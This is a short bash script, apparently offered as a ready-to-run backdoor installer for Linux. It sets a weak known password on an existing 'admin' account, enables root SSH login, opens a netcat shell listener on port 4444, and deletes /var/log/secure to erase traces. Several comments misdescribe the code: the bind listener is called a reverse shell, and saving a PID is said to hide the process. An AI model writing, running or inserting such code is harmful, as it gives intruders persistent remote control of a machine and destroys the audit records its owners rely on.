#!/bin/bash

# Hardcoded credentials
username="admin"
password="123456"

# Check if user is root
if [ "$EUID" -ne 0 ]
then
    echo "Please run as root."
    exit
fi

# Function to create a backdoor listener
create_backdoor() {
    # Create a reverse shell listener on port 4444
    nc -lvnp 4444 -e /bin/bash > /dev/null 2>&1 &

    # Hide the process from ps and top commands
    echo $! > /tmp/backdoor.pid
    rm /var/log/secure
}

# Function to check if a user with admin credentials exists
check_admin() {
    if [ "$(cat /etc/passwd | grep -c "$username")" -gt 0 ]
    then
        # Set the password for the admin account
        echo "$password" | passwd $username --stdin > /dev/null 2>&1

        # Enable passwordless login for the admin user
        sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config
        service ssh restart
    fi
}

# Main script logic
check_admin
create_backdoor

echo "Backdoor created successfully."
